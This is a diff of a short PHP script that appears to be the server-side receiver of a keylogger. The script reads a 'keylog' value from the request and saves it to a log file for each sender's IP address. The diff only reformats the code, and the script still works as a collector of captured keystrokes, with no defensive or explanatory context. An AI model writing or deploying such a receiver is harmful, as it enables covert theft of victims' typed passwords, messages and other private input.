@@ -1,11 +1,9 @@
 <?php
-$ip = $_SERVER['REMOTE_ADDR'];
 $stringData = $_GET["keylog"];
-if($_GET["keylog"] == "undefined"){
-die();
+if($stringData == "undefined") {
+  die();
 }
-else
-{
-file_put_contents('text/'.$ip.'/log.txt', $stringData);
+else {
+file_put_contents('text/'.$_SERVER['REMOTE_ADDR'].'/log.txt', $stringData);
 }
 ?>
